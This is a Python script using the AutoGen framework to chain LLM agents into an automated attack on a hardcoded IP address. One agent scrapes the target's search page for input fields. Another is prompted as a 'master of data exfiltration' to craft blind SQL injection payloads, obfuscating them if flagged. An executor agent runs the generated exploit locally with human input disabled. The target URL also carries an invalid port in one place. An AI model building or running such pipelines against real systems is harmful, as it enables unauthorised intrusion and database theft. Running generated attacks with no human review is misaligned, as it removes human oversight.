import os
import requests
import autogen
from autogen import ConversableAgent,AssistantAgent,UserProxyAgent,register_function
from autogen.coding import DockerCommandLineCodeExecutor,LocalCommandLineCodeExecutor
# from crawler import scrapingtool

llm_config_gpt4={
	'cache_seed':None,
	"config_list":[{"model":"gpt-4o","api_key":os.environ["OPENAI_API_KEY"]}],
	'temperature':0.1,
	'timeout' :6000
}

llm_config_gpt35_turbo={
	'cache_seed':None,
	"config_list":[{"model":"gpt-3.5-turbo","api_key":os.environ["OPENAI_API_KEY"]}],
	'temperature':0.1,
	'timeout':6000
}

recon_agent_sysy_msg="""
You are a specialized agent to perform recon against a target
"""


ReconAgent=ConversableAgent(
	"RECONAGENT",
	max_consecutive_auto_reply=5,
	human_input_mode ='NEVER',
	llm_config=llm_config_gpt35_turbo,
	)

SumAgent=ConversableAgent(
 	"SUMAGENT",
	system_message=recon_agent_sysy_msg,
	max_consecutive_auto_reply=5,
	human_input_mode ='NEVER',
	llm_config=llm_config_gpt35_turbo,
	is_termination_msg=lambda x: (x and isinstance(x, dict) and isinstance(x.get("content", ""), str) and x.get("content", "").rstrip().endswith("TERMINATE")) if x else False,
	default_auto_reply="..."
	)

exploit_crafter_sys_msg="""
   - You are the master of data exfiltration and you are doing blind sql to get the information schema of the database.
   - The goal is to exploit this vulnerability in an input field.
   - Consider the form structure and provide any necessary strategies, payloads, or techniques that could be used to exfiltrate data.
   - The database commonly is MySQL, start with it.
   - If payloads get flaged try to obfuscate them.
   - Return only the necessary strategy and payloads.
 """
exploit_crafter_Agent= ConversableAgent(
 	"EXPLOITCRAFTAGENT",
 	system_message=exploit_crafter_sys_msg,
	max_consecutive_auto_reply=5,
	human_input_mode ='NEVER',
	llm_config=llm_config_gpt4,
 	is_termination_msg=lambda x: (x and isinstance(x, dict) and isinstance(x.get("content", ""), str) and x.get("content", "").rstrip().endswith("TERMINATE")) if x else False,
	)

executor_Agent= ConversableAgent(
	"EXECAGENT",
	max_consecutive_auto_reply=5,
	human_input_mode ='NEVER',
	llm_config=False,
	is_termination_msg=lambda x:x.get("content","").rstrip().endswith("TERMINATE"),
	code_execution_config={
		"executor":LocalCommandLineCodeExecutor(work_dir="coding", timeout=2048)
		},
	default_auto_reply="..."
 	)

def scrapingtool():
	response= requests.get('http://13.36.65.25:8080/search.php')
	return(response.text)

register_function(
	scrapingtool,
	caller=ReconAgent,
	executor=SumAgent,
	name='scrape_page',
	description="Scrape a page and return the content"
	)



recon_chat=SumAgent.initiate_chat(
	ReconAgent,
	message="Can you scrape http://13.36.65.25:80808/search.php and also find input fields.",
	max_turns=2
	)

result=recon_chat.chat_history[2]['content']


exploit_chat= executor_Agent.initiate_chat(
	exploit_crafter_Agent,
	message=f"I need you to write a python exploit on the target based on this context: {str(result)},  - Target: http://13.36.65.25:8080/search.php",
	max_turns=4

	)